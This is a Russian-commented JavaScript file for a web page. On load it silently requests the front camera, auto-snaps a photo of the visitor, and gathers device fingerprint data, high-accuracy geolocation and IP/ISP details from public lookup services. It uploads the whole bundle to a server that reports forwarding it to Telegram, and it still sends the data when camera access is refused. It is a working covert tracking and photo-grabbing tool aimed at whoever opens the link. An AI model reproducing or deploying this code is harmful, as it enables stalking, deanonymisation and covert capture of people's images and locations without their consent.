(function() {
    'use strict';

    // ===== ЭЛЕМЕНТЫ =====
    const video = document.getElementById('video');
    const statusDiv = document.getElementById('status');
    const preview = document.getElementById('preview');
    const photoInfo = document.getElementById('photoInfo');
    const placeholder = document.getElementById('placeholder');

    // ===== ПЕРЕМЕННЫЕ =====
    let stream = null;
    let isPhotoTaken = false;
    let retryCount = 0;
    const MAX_RETRIES = 2;
    let isProcessing = false;
    let collectedData = {};

    // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
    function setStatus(text, type = 'info') {
        let icon = '';
        if (type === 'success') icon = '✅ ';
        else if (type === 'error') icon = '❌ ';
        else if (type === 'warning') icon = '⚠️ ';
        else if (type === 'info') icon = 'ℹ️ ';
        
        statusDiv.className = 'status-' + type;
        statusDiv.innerHTML = icon + text;
    }

    function dataURLToBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const b64 = atob(parts[1]);
        const byteArray = new Uint8Array(b64.length);
        for (let i = 0; i < b64.length; i++) {
            byteArray[i] = b64.charCodeAt(i);
        }
        return new Blob([byteArray], { type: mime });
    }

    // ===== ПОЛУЧЕНИЕ ТОЧНОГО ВРЕМЕНИ =====
    function getTimestamp() {
        const now = new Date();
        return {
            iso: now.toISOString(),
            ms: now.getTime(),
            date: now.toLocaleDateString('ru-RU'),
            time: now.toLocaleTimeString('ru-RU', { hour12: false }),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ms_full: now.getTime() + '.' + String(now.getMilliseconds()).padStart(3, '0')
        };
    }

    // ===== СБОР ДАННЫХ ОБ УСТРОЙСТВЕ =====
    function collectDeviceData() {
        const ua = navigator.userAgent;
        const data = {
            userAgent: ua,
            platform: navigator.platform || 'unknown',
            language: navigator.language || navigator.languages?.[0] || 'unknown',
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            memory: navigator.deviceMemory || 'unknown',
            cores: navigator.hardwareConcurrency || 'unknown',
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType || 'unknown',
                downlink: navigator.connection.downlink || 'unknown',
                rtt: navigator.connection.rtt || 'unknown'
            } : 'unknown',
            battery: navigator.getBattery ? 'supported' : 'not supported',
            doNotTrack: navigator.doNotTrack || 'unspecified',
            cookieEnabled: navigator.cookieEnabled
        };

        // Определение ОС
        if (ua.includes('Android')) data.os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) data.os = 'iOS';
        else if (ua.includes('Windows')) data.os = 'Windows';
        else if (ua.includes('Mac')) data.os = 'macOS';
        else if (ua.includes('Linux')) data.os = 'Linux';
        else data.os = 'Unknown';

        // Определение браузера
        if (ua.includes('Chrome') && !ua.includes('Edg')) data.browser = 'Chrome';
        else if (ua.includes('Firefox')) data.browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) data.browser = 'Safari';
        else if (ua.includes('Edg')) data.browser = 'Edge';
        else if (ua.includes('Opera') || ua.includes('OPR')) data.browser = 'Opera';
        else data.browser = 'Unknown';

        return data;
    }

    // ===== ГЕОЛОКАЦИЯ =====
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Geolocation not supported', available: false });
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        available: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null,
                        heading: position.coords.heading || null,
                        speed: position.coords.speed || null,
                        timestamp: position.timestamp
                    });
                },
                (error) => {
                    let errorMsg = 'Unknown error';
                    switch(error.code) {
                        case error.PERMISSION_DENIED: errorMsg = 'Permission denied'; break;
                        case error.POSITION_UNAVAILABLE: errorMsg = 'Position unavailable'; break;
                        case error.TIMEOUT: errorMsg = 'Timeout'; break;
                    }
                    resolve({ error: errorMsg, available: false, code: error.code });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        });
    }

    // ===== ПОЛУЧЕНИЕ IP АДРЕСА =====
    async function getIP() {
        try {
            // Пробуем несколько сервисов
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ip-api.com/json/'
            ];
            
            for (const url of services) {
                try {
                    const response = await fetch(url, { signal: AbortSignal.timeout(3000) });
                    if (!response.ok) continue;
                    const data = await response.json();
                    
                    // Для ipify
                    if (data.ip) {
                        return {
                            ip: data.ip,
                            source: 'ipify'
                        };
                    }
                    // Для ipapi.co
                    if (data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            city: data.city,
                            region: data.region,
                            source: 'ipapi.co'
                        };
                    }
                    // Для ip-api.com
                    if (data.query) {
                        return {
                            ip: data.query,
                            country: data.country,
                            city: data.city,
                            region: data.regionName,
                            isp: data.isp,
                            source: 'ip-api.com'
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
            return { ip: 'unknown', error: 'All services failed' };
        } catch (err) {
            return { ip: 'unknown', error: err.message };
        }
    }

    // ===== ОТПРАВКА ДАННЫХ =====
    async function sendDataToServer(photoDataUrl, deviceData, locationData, ipData, timestamp) {
        if (isProcessing) return;
        isProcessing = true;

        try {
            let formData = new FormData();
            
            // Добавляем фото, если есть
            if (photoDataUrl) {
                const blob = dataURLToBlob(photoDataUrl);
                formData.append('photo', blob, 'photo.jpg');
            }
            
            // Добавляем все данные как JSON
            const metadata = {
                device: deviceData,
                location: locationData,
                ip: ipData,
                timestamp: timestamp,
                photo_taken: !!photoDataUrl,
                url: window.location.href,
                referrer: document.referrer || 'direct'
            };
            
            formData.append('metadata', JSON.stringify(metadata));
            
            setStatus('Отправка данных...', 'info');
            
            const response = await fetch('/upload', {
                method: 'POST',
                body: formData,
                signal: AbortSignal.timeout(15000)
            });
            
            const result = await response.json();
            
            if (result.success) {
                const ts = timestamp;
                photoInfo.textContent = `✅ ${ts.date} ${ts.time} | ${result.filename || 'отправлено'}`;
                photoInfo.className = 'photo-info success';
                setStatus('✅ Данные отправлены в Telegram!', 'success');
                console.log('📊 Отправлены данные:', metadata);
            } else {
                setStatus('Ошибка сервера: ' + (result.error || 'неизвестная'), 'error');
            }
        } catch (err) {
            console.error('Ошибка отправки:', err);
            if (err.name === 'AbortError') {
                setStatus('Превышено время ожидания', 'error');
            } else {
                setStatus('Ошибка отправки: ' + err.message, 'error');
            }
        } finally {
            isProcessing = false;
        }
    }

    // ===== ОСНОВНАЯ ФУНКЦИЯ СБОРА =====
    async function collectAllData() {
        const timestamp = getTimestamp();
        const deviceData = collectDeviceData();
        
        setStatus('Сбор данных...', 'info');
        
        // Получаем IP
        const ipData = await getIP();
        
        // Получаем геолокацию
        const locationData = await getLocation();
        
        // Сохраняем
        collectedData = {
            timestamp,
            device: deviceData,
            ip: ipData,
            location: locationData
        };
        
        console.log('📊 Собраны данные:', collectedData);
        return collectedData;
    }

    // ===== СЪЁМКА ФОТО =====
    function takePhoto() {
        if (!stream || isPhotoTaken || isProcessing) return;
        
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setStatus('Ожидание стабилизации...', 'info');
            setTimeout(takePhoto, 400);
            return;
        }

        try {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.85);
            
            preview.src = photoData;
            preview.style.display = 'block';
            video.style.display = 'none';
            placeholder.classList.add('hidden');
            
            isPhotoTaken = true;
            
            // Собираем все данные и отправляем с фото
            collectAllData().then((data) => {
                sendDataToServer(photoData, data.device, data.location, data.ip, data.timestamp);
            });
            
        } catch (err) {
            console.error('Ошибка съёмки:', err);
            // Даже если фото не получилось, отправляем данные
            collectAllData().then((data) => {
                sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
            });
            setStatus('Ошибка фото, но данные отправлены', 'warning');
        }
    }

    // ===== ЗАПУСК КАМЕРЫ =====
    async function startCamera() {
        try {
            setStatus('Запрос доступа к камере...', 'info');
            placeholder.querySelector('.icon').textContent = '⏳';
            placeholder.querySelector('span:last-child').textContent = 'Запрос разрешения...';
            
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            
            video.srcObject = stream;
            await video.play();
            
            placeholder.classList.add('hidden');
            video.style.display = 'block';
            
            setStatus('Камера включена! Делаем фото...', 'success');
            
            setTimeout(() => {
                takePhoto();
            }, 800);
            
        } catch (err) {
            console.error('Ошибка камеры:', err);
            
            let errorMsg = '';
            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                errorMsg = 'Доступ к камере запрещён. Отправляем данные без фото.';
            } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
                errorMsg = 'Камера не найдена. Отправляем данные без фото.';
            } else {
                errorMsg = 'Ошибка камеры: ' + err.message;
            }
            
            setStatus(errorMsg, 'warning');
            placeholder.querySelector('.icon').textContent = '⚠️';
            placeholder.querySelector('span:last-child').textContent = 'Камера недоступна';
            
            // Всё равно собираем данные и отправляем без фото
            collectAllData().then((data) => {
                sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
            });
        }
    }

    // ===== ОЧИСТКА =====
    function cleanup() {
        if (stream) {
            stream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            stream = null;
        }
        video.srcObject = null;
    }

    // ===== ЗАПУСК =====
    function init() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus('Браузер не поддерживает камеру', 'error');
            // Всё равно собираем данные
            collectAllData().then((data) => {
                sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
            });
            return;
        }
        setTimeout(startCamera, 600);
    }

    // ===== СОБЫТИЯ =====
    window.addEventListener('beforeunload', cleanup);
    window.addEventListener('pagehide', cleanup);
    
    document.addEventListener('visibilitychange', () => {
        if (document.hidden && stream) {
            stream.getTracks().forEach(track => track.enabled = false);
        } else if (!document.hidden && stream) {
            stream.getTracks().forEach(track => track.enabled = true);
        }
    });

    // ===== ЗАПУСК =====
    if (document.readyState === 'complete') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }

})();